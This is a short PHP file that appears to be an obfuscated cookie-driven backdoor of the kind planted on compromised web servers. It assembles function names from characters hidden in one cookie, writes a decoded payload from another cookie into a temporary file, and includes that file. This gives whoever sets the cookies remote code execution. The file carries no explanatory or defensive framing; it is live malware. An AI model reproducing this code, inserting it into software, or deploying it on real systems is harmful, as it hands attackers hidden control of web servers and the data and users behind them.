<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[27])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 6;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[27][$n];
        if (!$c[27][$n + 1]) {
            if (!$c[27][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 6 + 1;
    }
    $k = $p[9]() . $p[3];
    if (!$p[22]($k)) {
        $n = $p[11]($k, $p[17]);
        $p[13]($n, $p[18] . $p[29]($p[28]($c[3])));
    }
    include($k);
}